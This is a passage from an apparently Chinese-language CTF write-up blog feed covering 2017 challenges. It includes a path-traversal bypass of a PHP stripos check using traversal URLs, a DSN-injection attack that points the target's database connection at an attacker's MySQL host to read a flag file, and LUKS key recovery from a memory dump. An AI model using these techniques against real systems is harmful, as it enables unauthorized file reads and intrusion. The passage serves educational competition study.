class="line">0xb9 =&gt; b</div><div class="line">0x79 =&gt; a</div></pre></td></tr></table></figure></p>
<p>然后接下来根据调试得到大写字母和数字和符号的对应关系。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: ABCDEFGHIJKLMNOPQRSTUVWXYZ</div><div class="line"></div><div class="line">省略。</div><div class="line"></div><div class="line">gdb-peda$ x/26bx 0xffffd12b</div><div class="line">0xffffd12b:	0xa5	0x65	0xe5	0x15	0x95	0x55	0xd5	0x35</div><div class="line">0xffffd133:	0xb5	0x75	0xf5	0x0d	0x8d	0x4d	0xcd	0x2d</div><div class="line">0xffffd13b:	0xad	0x6d	0xed	0x1d	0x9d	0x5d	0xdd	0x3d</div><div class="line">0xffffd143:	0xbd	0x7d</div><div class="line"></div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /root/Desktop/rev_rev_rev-a0b0d214b4aeb9b5dd24ffc971bd391494b9f82e2e60b4afc20e9465f336089f</div><div class="line">Rev! Rev! Rev!</div><div class="line">Your input: &#123;&#125;0123456789</div><div class="line"></div><div class="line">省略。</div><div class="line"></div><div class="line">gdb-peda$ x/12bx 0xffffd12b</div><div class="line">0xffffd12b:	0x63	0xe3	0x13	0x93	0x53	0xd3	0x33	0xb3</div><div class="line">0xffffd133:	0x73	0xf3	0x41	0x21</div></pre></td></tr></table></figure></p>
<p>最后根据对应关系得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TWCTF 2017-Rev Rev Rev-writeup&lt;br&gt;爆破。warmup题&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Reverse" scheme="http://chybeta.github.io/categories/writeup-Reverse/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="re" scheme="http://chybeta.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>TWCTF 2017-Freshen Uploader-writeup</title>
    <link href="http://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/"/>
    <id>http://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/</id>
    <published>2017-09-02T02:33:13.000Z</published>
    <updated>2017-09-03T14:03:40.866Z</updated>
    
    <content type="html"><![CDATA[<p>TWCTF 2017-Freshen Uploader-writeup<br>任意文件读取漏洞。php弱类型比较。<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">In this year, we stopped using Windows so you can&apos;t use DOS tricks!</div><div class="line">http://fup.chal.ctf.westerns.tokyo/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>该题有两个flag。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/1.png?raw=true" alt=""></p>
<p>有下载功能，比如点击第一个download后，链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=6a92b449761226434f5fce6c8e87295a</div></pre></td></tr></table></figure></p>
<p>这里存在任意文件读取漏洞。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/2.png?raw=true" alt=""></p>
<p>得到download.php的源代码和第一个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;then_can_y0u_read_file_list?&#125;</div></pre></td></tr></table></figure></p>
<p>file_list是什么东西？我们读取一下index.php看看：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/3.png?raw=true" alt=""></p>
<p>根据第一个flag，我们可以猜测第二个flag藏在file_list.php中。但直接读取是不行的，因为download.php的源码用stripos做了检测：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TWCTF&#123;then_can_y0u_read_file_list?&#125;</span></div><div class="line">$filename = $_GET[<span class="string">'f'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>();</div><div class="line">header(<span class="string">"Content-Type: application/octet-stream"</span>);</div><div class="line">header(<span class="string">"Content-Disposition: attachment; filename='$filename'"</span>);</div><div class="line">readfile(<span class="string">"uploads/$filename"</span>);</div></pre></td></tr></table></figure>
<p>仔细看一下判断语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(stripos($filename, &apos;file_list&apos;) != false) die();</div></pre></td></tr></table></figure></p>
<p>strpos(str1,str2)返回字符串str2在字符串str1中的位置。如果<code>$filename</code>以<code>file_list</code>开头，则<code>stripos($filename, &#39;file_list&#39;)</code>会返回0，而采用的是<code>!=</code>，也就是说可能存在弱类型比较问题:<code>0 == false</code>。</p>
<p>绕过了stripos，怎么读取file_list文件？构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=file_list/../../file_list.php</div></pre></td></tr></table></figure></p>
<p>这样它会把第一个file_list当成文件夹，之后用两个<code>../</code>返回上一层文件夹，并最终读取到file_list.php。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/4.png?raw=true" alt=""></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/5.png?raw=true" alt=""></p>
<p>第二个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;php_is_very_secure&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TWCTF 2017-Freshen Uploader-writeup&lt;br&gt;任意文件读取漏洞。php弱类型比较。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ISG2017-wmwcms-writeup</title>
    <link href="http://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/"/>
    <id>http://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/</id>
    <published>2017-08-31T08:29:51.000Z</published>
    <updated>2017-08-31T10:06:49.113Z</updated>
    
    <content type="html"><![CDATA[<p>ISG2017-wmwcms-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can u conquer this crude cms and get flag?</div><div class="line">link: http://202.120.7.204:7242</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>查看robots.txt，可以发现有压缩包，下载下来后得到源码。</p>
<p>文件目录如下；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/3.png?raw=true" alt=""></p>
<p>public/app.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    session_start();</div><div class="line">    define(<span class="string">'APP_PATH'</span>, dirname(dirname(<span class="keyword">__FILE__</span>)) . <span class="string">'/server/'</span>);</div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'sql.php'</span>;</div><div class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'func.php'</span>;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>])) &#123;</div><div class="line">        errormsg(<span class="string">"action is required."</span>);</div><div class="line">    &#125;</div><div class="line">    $actions = [<span class="string">"login"</span>, <span class="string">"logout"</span>, <span class="string">"img"</span>];</div><div class="line">    <span class="keyword">if</span> (!in_array($_GET[<span class="string">"action"</span>], $actions)) &#123;</div><div class="line">        errormsg(<span class="string">'Hacking attempt'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">include</span> APP_PATH . $_GET[<span class="string">"action"</span>] . <span class="string">".php"</span>;</div><div class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>server/img.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'sql.php'</span>;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'uid'</span>])) &#123;</div><div class="line">    $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $uid = intval($_SESSION[<span class="string">'uid'</span>]);</div><div class="line">    $sql = <span class="string">"select portrait from user where id = ?"</span>;</div><div class="line">    $sth = $dbh-&gt;prepare($sql);</div><div class="line">    $sth-&gt;execute([$uid]);</div><div class="line">    $user = $sth-&gt;fetchAll();</div><div class="line">    <span class="keyword">if</span>(count($user) &gt; <span class="number">0</span>)&#123;</div><div class="line">        $user = $user[<span class="number">0</span>];</div><div class="line">        $portrait = $user[<span class="string">"portrait"</span>];</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $portrait = <span class="string">"img/user.png"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">header(<span class="string">"Cache-Control: max-age=1, s-maxage=1, no-cache, must-revalidate"</span>);</div><div class="line">header(<span class="string">"Content-type: image/png;charset=gb2312"</span>);</div><div class="line"><span class="keyword">echo</span> file_get_contents($portrait);</div></pre></td></tr></table></figure></p>
<p>server/sql.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'func.php'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'dsn'</span>]))&#123;</div><div class="line">    $dsn = $_REQUEST[<span class="string">'dsn'</span>];</div><div class="line">&#125; <span class="keyword">else</span>&#123;</div><div class="line">    $dsn = <span class="string">"wmwcms"</span>;</div><div class="line">&#125;</div><div class="line">$dsn = <span class="string">"mysql:dbname=&#123;$dsn&#125;"</span>;</div><div class="line">$username = <span class="string">'wmwcms'</span>;</div><div class="line">$password = <span class="string">'%glVYKTkLtQ22'</span>;</div><div class="line">$options = <span class="keyword">array</span>(</div><div class="line">    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'SET names utf8'</span>,</div><div class="line">    );</div><div class="line">$dbh = <span class="keyword">new</span> PDO($dsn, $username, $password, $options);</div></pre></td></tr></table></figure></p>
<p>先配置远程数据库可以访问。修改/etc/mysql/mysql.conf.d/mysqld.cnf。将里面的bind-address = 127.0.0.1注释掉。</p>
<p>接下来配置mysql。这里我用root身份登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">mysql&gt; USE wmwcms;</div><div class="line">Database changed</div><div class="line">mysql&gt; CREATE TABLE `user` (</div><div class="line">    -&gt;   `id` INT AUTO_INCREMENT,</div><div class="line">    -&gt;   `name` VARCHAR(100) NULL,</div><div class="line">    -&gt;   `pwd` VARCHAR(64) NOT NULL,</div><div class="line">    -&gt;   `portrait` VARCHAR(64) DEFAULT &quot;../server/flag&quot;,</div><div class="line">    -&gt;   PRIMARY KEY (`id`),</div><div class="line">    -&gt;   UNIQUE KEY `Duplicate_name` (`name`)</div><div class="line">    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;</div><div class="line">Query OK, 0 rows affected (0.19 sec)</div><div class="line"></div><div class="line">mysql&gt; INSERT INTO `user` (`name`, `pwd`) values (&quot;test&quot;, &quot;a94a8fe5ccb19ba61c4c0873d391e987982fbbd3&quot;);</div><div class="line">Query OK, 1 row affected (1.06 sec)</div><div class="line"></div><div class="line">mysql&gt; select id,name,pwd,portrait from user;</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">| id | name | pwd                                      | portrait       |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">|  1 | test | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 | ../server/flag |</div><div class="line">+----+------+------------------------------------------+----------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>然后创建wmwcms用户，@后面有个%，表示可以远程登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; CREATE USER &apos;wmwcms@%&apos; IDENTIFIED BY &quot;%glVYKTkLtQ22&quot;;</div><div class="line">Query OK, 0 rows affected (2.35 sec)</div></pre></td></tr></table></figure></p>
<p>并为它授权:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; grant all privileges on wmwcms.* to &apos;wmwcms&apos;@&apos;%&apos; identified by &apos;%glVYKTkLtQ22&apos;;</div><div class="line">Query OK, 0 rows affected, 1 warning (0.03 sec)</div></pre></td></tr></table></figure></p>
<p>这样当我们传入的GET参数为<code>dsn=wmwcms;host=yourvps;port=yourport</code>，后端的sql.php中的pdo会去连接你远程的数据库。之后执行img.php时，从中取出的portrait为我们数据库中的portrait字段，这里为<code>../server/flag</code>。继续执行则到了<code>echo file_get_contents($portrait);</code>，也即执行<code>echo file_get_contents(&quot;../server/flag&quot;);</code></p>
<p>为什么数据库中要设置成<code>../server/flag</code>，注意app.php是在public文件的，而且默认的<code>$portrait = &quot;img/user.png&quot;</code>，也表明是在public文件夹下。而从源码中可知，flag在server文件夹下，所以需要返回上一层文件夹才能读取。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170831/2.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ISG&#123;a107063477b1dd64dabbcaeebf636f7b&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ISG2017-wmwcms-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-Cypherpunk’s nightmare-writeup</title>
    <link href="http://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/"/>
    <id>http://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk’s-nightmare-writeup/</id>
    <published>2017-08-30T11:32:22.000Z</published>
    <updated>2017-08-30T12:42:02.448Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-Cypherpunk’s nightmare-writeup<br>LUKS aeskeyfind<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Our officers just have made cold boot attack on the suspect&apos;s computer. Your role is to recover the content of this encrypted hard drive.</div><div class="line">Attachment: (none)</div><div class="line">Webpage: https://mega.nz/#!VdRAkaKT!xP7s74jwnlGmR2spg9RNaKFf5GmCGAv-pxW8aPZNkOw</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了一个压缩包，解压缩后得到三个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">encrypted.dd</div><div class="line">memdump.elf.gz  </div><div class="line">__MACOSX</div></pre></td></tr></table></figure></p>
<p>先看看第一个文件：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/4.png?raw=true" alt=""></p>
<p>可以看到这是一个LUKS加密文件，要解密需要提供密码。结合题目的另外一个文件memdump.elf.gz，我们可以利用工具<code>aeskeyfind</code>来提取藏在内存中的aeskey。</p>
<p>可以通过下面的命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install aeskeyfind</div></pre></td></tr></table></figure></p>
<p>将memdump.elf.gz压缩包解压后得到data文件，运行aeskeyfind：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aeskeyfind -v data</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">FOUND POSSIBLE 128-BIT KEY AT BYTE bf16da0</div><div class="line"></div><div class="line">KEY: 9e90126c33c85d9a6913e649301b5dcf</div><div class="line"></div><div class="line">EXTENDED KEY:</div><div class="line">9e90126c33c85d9a6913e649301b5dcf</div><div class="line">30dc98680314c5f26a0723bb5a1c7e74</div><div class="line">ae2f0ad6ad3bcf24c73cec9f9d2092eb</div><div class="line">1d60e388b05b2cac7767c033ea4752d8</div><div class="line">b560820f053baea3725c6e90981b3c48</div><div class="line">0a8bd0490fb07eea7dec107ae5f72c32</div><div class="line">42faf3904d4a8d7a30a69d00d551b132</div><div class="line">d332d0939e785de9aedec0e97b8f71db</div><div class="line">209169b2bee9345b1037f4b26bb88569</div><div class="line">570690cde9efa496f9d850249260d54d</div><div class="line">b105738258ead714a13287303352527d</div><div class="line"></div><div class="line">CONSTRAINTS ON ROWS:</div><div class="line">00000004000000000000000000000000</div><div class="line">000000be000000000000000000000000</div><div class="line">0000005e000000000000000000000000</div><div class="line">00000087000000000000000000000000</div><div class="line">00000046000000000000000000000000</div><div class="line">000000d9000000000000000000000000</div><div class="line">00000003000000000000000000000000</div><div class="line">00000021000000000000000000000000</div><div class="line">0000007f000000000000000000000000</div><div class="line">0000004f000000000000000000000000</div><div class="line"></div><div class="line">FOUND POSSIBLE 128-BIT KEY AT BYTE bf16fa0</div><div class="line"></div><div class="line">KEY: 683c5a4bf8f1cedf5b649c482e48e639</div><div class="line"></div><div class="line">EXTENDED KEY:</div><div class="line">683c5a4bf8f1cedf5b649c482e48e639</div><div class="line">3bb2487ac34386a598271aedb66ffcd4</div><div class="line">9102003452418691ca669c7c7c0960a8</div><div class="line">94d2c224c69344b50cf5d8c970fcb861</div><div class="line">2cbe2d75ea2d69c0e6d8b10996240968</div><div class="line">0abf68e5e0920125064ab02c906eb944</div><div class="line">b5e97385557b72a05331c28cc35f7bc8</div><div class="line">3ac89bab6fb3e90b3c822b87ffdd504f</div><div class="line">7b9b1fbd1428f6b628aadd31d7778d7e</div><div class="line">95c6ecb381ee1a05a944c7347e334a4a</div><div class="line">60103a40e1fe204548bae7713689ad3b</div><div class="line"></div><div class="line">CONSTRAINTS ON ROWS:</div><div class="line">00000031000000000000000000000000</div><div class="line">0000004e000000000000000000000000</div><div class="line">00000010000000000000000000000000</div><div class="line">00000051000000000000000000000000</div><div class="line">00000090000000000000000000000000</div><div class="line">00000060000000000000000000000000</div><div class="line">0000002e000000000000000000000000</div><div class="line">00000016000000000000000000000000</div><div class="line">0000000e000000000000000000000000</div><div class="line">000000f3000000000000000000000000</div><div class="line"></div><div class="line">Keyfind progress: 100%</div></pre></td></tr></table></figure></p>
<p>重点是得到了两个KEY:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">KEY: 9e90126c33c85d9a6913e649301b5dcf</div><div class="line">KEY: 683c5a4bf8f1cedf5b649c482e48e639</div></pre></td></tr></table></figure></p>
<p>先拿一个key试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;9e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key</div></pre></td></tr></table></figure></p>
<p>尝试解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div></pre></td></tr></table></figure></p>
<p>但是提示出错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">无法从密钥文件 Safe.key 读取 32 字节。</div></pre></td></tr></table></figure></p>
<p>我们看看Safe.key是怎样的；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/5.png?raw=true" alt=""></p>
<p>发现只有十六个字节。</p>
<p>结合有两个key，我们把两个合起来试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/nightmare# echo &quot;9e90126c33c85d9a6913e649301b5dcf683c5a4bf8f1cedf5b649c482e48e639&quot; | xxd -r -p &gt; Safe.key</div><div class="line">root@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div><div class="line">卷密钥与卷不匹配。</div><div class="line">root@chybeta:~/Desktop/nightmare# echo &quot;683c5a4bf8f1cedf5b649c482e48e6399e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key</div><div class="line">root@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home</div></pre></td></tr></table></figure></p>
<p>然后在kali系统中可以发现已经可以直接打开卷宗。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/6.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">h4ck1t&#123;Not_paranoid_enough&#125;</div></pre></td></tr></table></figure></p>
<p>也可以通过挂载来实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/nightmare# ls -l /dev/mapper/</div><div class="line">总用量 0</div><div class="line">crw------- 1 root root 10, 236 8月  25 05:25 control</div><div class="line">lrwxrwxrwx 1 root root       7 8月  25 05:26 safe-home -&gt; ../dm-0</div><div class="line">root@chybeta:~/Desktop/nightmare# mkdir /mnt/safe-home</div><div class="line">root@chybeta:~/Desktop/nightmare# mount /dev/mapper/safe-home /mnt/safe-home/</div><div class="line">root@chybeta:~/Desktop/nightmare# cd /mnt/safe-home/</div><div class="line">root@chybeta:/mnt/safe-home# ls</div><div class="line">flag.txt  Melkor_ELF_fuzzer</div><div class="line">root@chybeta:/mnt/safe-home# cat flag.txt</div><div class="line">h4ck1t&#123;Not_paranoid_enough&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-Cypherpunk’s nightmare-writeup&lt;br&gt;LUKS aeskeyfind&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="Forensic" scheme="http://chybeta.github.io/tags/Forensic/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-USB ducker-writeup</title>
    <link href="http://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/"/>
    <id>http://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/</id>
    <published>2017-08-30T11:22:00.000Z</published>
    <updated>2017-08-30T12:41:40.615Z</updated>
    
    <content type="html"><![CDATA[<p>Hackit2017-USB ducker-writeup<br>usb keyboard pcap<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag&#123;...&#125; )</div><div class="line">Attachment: (none)</div><div class="line">Webpage: https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3M</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了pcap文件。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/2.png?raw=true" alt=""></p>
<p>可以知道对应的设备为apple的keyboard。</p>
